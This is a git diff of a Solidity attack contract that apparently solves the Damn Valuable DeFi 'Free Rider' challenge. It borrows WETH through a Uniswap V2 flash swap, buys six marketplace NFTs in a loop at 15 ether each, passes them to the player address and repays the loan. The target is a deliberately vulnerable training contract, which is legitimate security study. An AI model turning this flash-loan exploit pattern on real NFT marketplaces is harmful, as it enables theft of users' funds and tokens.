@@ -25,8 +25,9 @@ contract UniswapFlashSwap is IUniswapV2Callee, IERC721Receiver {
   address private dvt;
   // Uniswap V2 factory
   address private factory ;
-  FreeRiderNFTMarketplace market;
-  DamnValuableNFT nft;
+  FreeRiderNFTMarketplace private market;
+  DamnValuableNFT private nft;
+  address private player;
 
   event Log(string message, uint val);
   constructor(address _dvt, address _factory, address payable _market, address _nft) {
@@ -49,6 +50,7 @@ contract UniswapFlashSwap is IUniswapV2Callee, IERC721Receiver {
     address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
     require(pair != address(0), "!pair");
 
+    player = msg.sender;
     address token0 = IUniswapV2Pair(pair).token0();
     address token1 = IUniswapV2Pair(pair).token1();
     uint amount0Out = _tokenBorrow == token0 ? _amount : 0;
@@ -99,28 +101,19 @@ contract UniswapFlashSwap is IUniswapV2Callee, IERC721Receiver {
     console.log("After BALANCE TOKEN 0: ", balance0);
     console.log("After BALANCE TOKEN 1: ", balance1);
 
-    uint256[] memory tokenIds = new uint256[](1);
-    tokenIds[0] = 0;
-    console.log("contract Balance: ", address(this).balance);
     WETH wethContract = WETH(tokenBorrow);
+    console.log("contract Balance: ", address(this).balance);
     wethContract.withdraw(balance0);
-    console.log("Now contract Balance: ", address(this).balance);
-    console.log("offersCount : ", market.offersCount());
-    market.buyMany{value: 15 ether}(tokenIds);
-    console.log("after Buy Many", address(this).balance);
-    // console.log("bought", address(this));
-    // console.log("offersCount : ", market.offersCount());
-    // console.log("1contract Balance: ", address(this).balance);
-    // nft.setApprovalForAll(address(market), true);
-    // uint256[] memory prices = new uint256[](1);
-    // prices[0] = 1;
-    // market.offerMany(tokenIds,prices);
-
-    console.log("2contract Balance: ", address(this).balance);
-
+    console.log("Now contract Balance: ", address(this).balance); 
+    for(uint8 i = 0; i< 6 ; i ++) {
+      uint256[] memory tokenIds = new uint256[](1);
+      tokenIds[0] = i;
+      market.buyMany{value: 15 ether}(tokenIds);
+      console.log("after Buy Many", address(this).balance);
+      nft.transferFrom(address(this), player, i);
+    }
     wethContract.deposit{value:amountToRepay}();
     wethContract.transfer(pair, amountToRepay);
-    console.log("DOne dana done"); 
   }
   receive() external payable {
     console.log("Received Money");
